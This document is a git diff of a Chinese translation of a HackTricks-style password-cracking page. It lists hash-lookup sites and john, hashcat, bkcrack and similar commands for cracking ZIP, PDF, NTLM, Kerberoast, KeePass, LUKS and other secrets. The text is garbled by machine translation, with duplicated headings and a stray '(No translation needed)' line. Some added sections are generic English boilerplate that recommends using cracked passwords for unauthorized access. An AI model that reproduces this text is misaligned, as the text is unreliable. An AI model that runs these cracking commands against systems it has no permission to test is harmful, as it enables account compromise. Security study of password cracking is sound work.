-* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker)（MD5、NTLM、SHA1、MySQL5、SHA256、SHA512）
-* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html)（MD5）
+* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 和 SHA1)
+* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1，带/不带ESS/SSP和任何挑战值)
+* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (哈希值，WPA2 捕获，以及 MSOffice、ZIP、PDF 的存档...)
+* [https://crackstation.net/](https://crackstation.net) (哈希值)
+* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
+* [https://gpuhash.me/](https://gpuhash.me) (哈希值和文件哈希值)
+* [https://hashes.org/search.php](https://hashes.org/search.php) (哈希值)
+* [https://www.cmd5.org/](https://www.cmd5.org) (哈希值)
+* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5、NTLM、SHA1、MySQL5、SHA256、SHA512)
+* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 * [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-在尝试暴力破解哈希之前，请先查看这些。
+在尝试对哈希进行暴力破解之前，请查看这些内容。
 
 ### ZIP
 ```bash
@@ -612,9 +596,9 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
-#### 已知明文zip攻击
+#### 已知明文 zip 攻击
 
-您需要知道加密zip内部**包含文件的** **明文**（或部分明文）。您可以通过运行：**`7z l encrypted.zip`** 来检查加密zip内部**文件的名称和大小**。\
+您需要知道加密 zip 文件中包含的文件的**明文**（或部分明文）。您可以通过运行以下命令来检查加密 zip 中包含的文件的**文件名和文件大小**：**`7z l encrypted.zip`**\
 从发布页面下载 [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)。
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -628,6 +612,8 @@ zip plaintext.zip plaintext.file
 unzip unlocked.zip #User new_pwd as password
 ```
 ### 7z
+
+### 7z
 ```bash
 cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
 ```
@@ -640,7 +626,7 @@ apt-get install libcompress-raw-lzma-perl
 ```
 ### PDF
 
-(No translation needed)
+### PDF
 ```bash
 apt-get install pdfcrack
 pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
@@ -649,9 +635,9 @@ pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
 sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
-### PDF所有者密码
+### PDF Owner Password
 
-要破解PDF所有者密码，请查看此内容：[https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+要破解PDF所有者密码，请查看此链接：[https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -665,12 +651,16 @@ python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5h
 python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
 john jwt.john #It does not work with Kali-John
 ```
-### NTLM 破解
+### NTLM破解
 ```bash
 Format:USUARIO:ID:HASH_LM:HASH_NT:::
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
 hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
 ```
+### Keepass
+
+### Keepass
+
 ### Keepass
 ```bash
 sudo apt-get install -y kpcli #Install keepass tools like keepass2john
@@ -680,14 +670,16 @@ keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a f
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 ### Keberoasting
+
+### Keberoasting
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Lucks 图像
+### 破解LUKS镜像
 
-#### 方法 1
+#### 方法1
 
 安装：[https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
@@ -705,33 +697,33 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-### Mysql
+另一个Luks BF教程：[http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
-[//]: # (The above section remains untranslated as it contains a URL and a section title that should not be translated.)
+### Mysql
 ```bash
 #John hash format
 <USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
-### PGP/GPG 私钥
+### PGP/GPG私钥
 ```bash
 gpg2john private_pgp.key #This will generate the hash and save it in a file
 john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 ```
-### 思科
+### Cisco
 
 <figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>
 
-### DPAPI 主密钥
+### DPAPI Master Key
 
 使用 [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) 然后使用 john
 
-### Open Office 密码保护列
+### Open Office Pwd Protected Column
 
-如果你有一个 xlsx 文件，其中一列被密码保护，你可以取消保护：
+如果你有一个受密码保护的 xlsx 文件，你可以解除其保护：
 
-* **上传到谷歌云端硬盘**，密码将自动被移除
-* 要**手动移除**密码：
+* **将其上传到谷歌云盘**，密码将自动移除
+* **手动**进行**移除**：
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -750,7 +742,7 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 <figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 来轻松构建并**自动化工作流程**，这些工作流程由世界上**最先进**的社区工具提供支持。\
+使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 来轻松构建和**自动化工作流**，利用世界上**最先进**的社区工具。\
 立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -759,25 +751,25 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 
 **哈希示例：** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
-### 哈希识别器
+### 哈希标识符
 ```bash
 hash-identifier
 > <HASH>
 ```
-### 词表
+### 字典列表
 
 * **Rockyou**
 * [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 * [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
-* [**Seclists - 密码**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
+* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **词表生成工具**
+### **字典生成工具**
 
-* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 高级键盘走位生成器，可配置基础字符、键位图和路径。
+* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 高级键盘漫步生成器，可配置基本字符、键位图和路径。
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
-### John 变异
+### John变异
 
 阅读 _**/etc/john/john.conf**_ 并进行配置
 ```bash
@@ -786,18 +778,18 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 ```
 ### Hashcat
 
-#### Hashcat 攻击
+#### Hashcat攻击
 
-* **字典攻击** (`-a 0`) 配合规则
+* **字典攻击** (`-a 0`) with rules
 
-**Hashcat** 已经包含了一个**包含规则的文件夹**，但你可以在[**这里找到其他有趣的规则**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。
+**Hashcat**已经带有一个**包含规则的文件夹**，但你也可以在[**这里找到其他有趣的规则**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
-* **Wordlist combinator** 攻击
+* **字典组合** 攻击
 
-可以使用hashcat将**两个词表合并成一个**。\
-如果列表1包含单词 **"hello"**，第二个列表包含两行，单词分别是 **"world"** 和 **"earth"**。将会生成单词 `helloworld` 和 `helloearth`。
+可以使用 hashcat 将 2 个字典**合并为 1 个**。\
+如果列表 1 包含单词 **"hello"**，第二个包含两行单词 **"world"** 和 **"earth"**。将生成单词 `helloworld` 和 `helloearth`。
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -840,7 +832,7 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 ## Use it to crack the password
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
-* 字典 + 掩码（`-a 6`）/ 掩码 + 字典（`-a 7`）攻击
+* 字典 + 掩码 (`-a 6`) / 掩码 + 字典 (`-a 7`) 攻击
 ```bash
 # Mask numbers will be appended to each word in the wordlist
 hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
@@ -852,41 +844,74 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-# 破解Linux哈希 - /etc/shadow文件
+## Brute Forcing
+
+Brute forcing is a common technique used to crack passwords by systematically trying all possible combinations of characters until the correct one is found. When it comes to cracking Linux hashes stored in the `/etc/shadow` file, brute forcing can be a powerful method if the passwords are weak or easily guessable.
+
+### Tools and Resources
+
+There are various tools available for brute forcing Linux hashes, such as John the Ripper, Hashcat, and Hydra. These tools can be used to automate the process of trying different password combinations quickly and efficiently.
+
+### Methodology
+
+1. Obtain the Linux hash from the `/etc/shadow` file.
+2. Use a brute force tool to systematically try different password combinations.
+3. Monitor the tool's progress and wait for it to find the correct password.
+4. Once the password is found, it can be used to gain unauthorized access to the system.
+
+### Considerations
+
+- Brute forcing can be time-consuming, especially for complex passwords.
+- It is important to use a good wordlist and set up proper configurations for the brute force tool to increase the chances of success.
+- Brute forcing should only be performed on systems and files that you have permission to test.
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-# 破解Windows哈希值
+# Brute Force
 
-Windows操作系统使用多种哈希算法来存储用户密码，通常是以加密形式。当攻击者获得这些哈希值时，他们可以使用不同的方法来破解密码，例如暴力破解、字典攻击或彩虹表攻击。
+Brute force attacks are a common way to crack passwords. They consist of systematically checking all possible passwords until the correct one is found. Brute force attacks can be time-consuming but are often effective.
 
-## 常见的哈希类型
+## Tools
 
-Windows系统中最常见的哈希类型包括LM哈希和NTLM哈希。LM哈希较为古老，安全性较低，因此现代系统中较少使用。NTLM哈希是一种更安全的算法，但仍然可以通过专业工具进行破解。
+There are several tools available for conducting brute force attacks, such as Hydra, Medusa, and John the Ripper. These tools can be used to automate the password cracking process and increase efficiency.
 
-## 工具和资源
+## Methodology
 
-破解Windows哈希值时，可以使用多种工具，如Hashcat、John the Ripper等。这些工具支持多种破解技术，并可以利用GPU加速破解过程。
+1. **Password List**: Create or obtain a password list to use for the brute force attack. These lists can contain commonly used passwords, dictionary words, or custom combinations.
 
-## 获取哈希值
+2. **Selecting the Target**: Identify the target system or service you want to attack. This could be a login page, SSH server, or any other system that requires a password.
 
-在进行破解之前，首先需要获取目标系统的哈希值。这可以通过多种方法实现，例如从活动目录、内存转储或本地安全账户数据库中提取。
+3. **Configuring the Tool**: Set up the chosen brute force tool with the target system's information, such as the IP address, port, and protocol.
 
-## 破解过程
+4. **Initiate the Attack**: Start the brute force attack using the configured tool and password list. The tool will systematically try each password until the correct one is found or the attack is stopped.
 
-一旦获得哈希值，就可以使用上述工具进行破解。破解过程可能需要一些时间，取决于密码的复杂性和所使用的硬件性能。
+5. **Analyzing Results**: Once the attack is complete, analyze the results to determine if any passwords were successfully cracked. Use the cracked passwords to gain unauthorized access or improve the system's security.
 
-## 防御措施
-
-为了防止哈希值被破解，建议使用复杂且长度较长的密码，并定期更新。此外，可以启用额外的安全措施，如多因素认证。
+By following this methodology and using the right tools, you can effectively crack Windows hashes and gain access to protected systems or accounts.
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-破解常见应用程序哈希
+## 破解常见应用程序哈希
+
+Brute-forcing hashes is a common technique used to crack passwords. By generating all possible combinations of characters and comparing the resulting hash values with the target hash, it is possible to determine the original password.
+
+### 常见应用程序哈希破解
+
+1. **MD5 Hashes**: MD5 hashes are commonly used in various applications. Tools like Hashcat can be used to brute-force MD5 hashes.
+
+2. **SHA-1 Hashes**: SHA-1 hashes are also widely used. Tools like John the Ripper can be used to crack SHA-1 hashes.
+
+3. **SHA-256 Hashes**: SHA-256 hashes are more secure but can still be cracked using tools like Hashcat or John the Ripper.
+
+4. **NTLM Hashes**: NTLM hashes are used in Windows environments. Tools like Hashcat or Mimikatz can be used to crack NTLM hashes.
+
+5. **LM Hashes**: LM hashes are less secure and can be cracked using tools like Ophcrack.
+
+By using these tools and techniques, hackers can attempt to crack common application hashes and gain unauthorized access to systems.
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -898,22 +923,22 @@ Windows系统中最常见的哈希类型包括LM哈希和NTLM哈希。LM哈希�
 ```
 <details>
 
-<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击成为英雄！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
 支持HackTricks的其他方式：
 
-* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
+* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
 <figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 轻松构建并**自动化工作流程**，由世界上**最先进的**社区工具提供支持。\
+使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)轻松构建和**自动化工作流程**，利用世界上**最先进**的社区工具。\
 立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
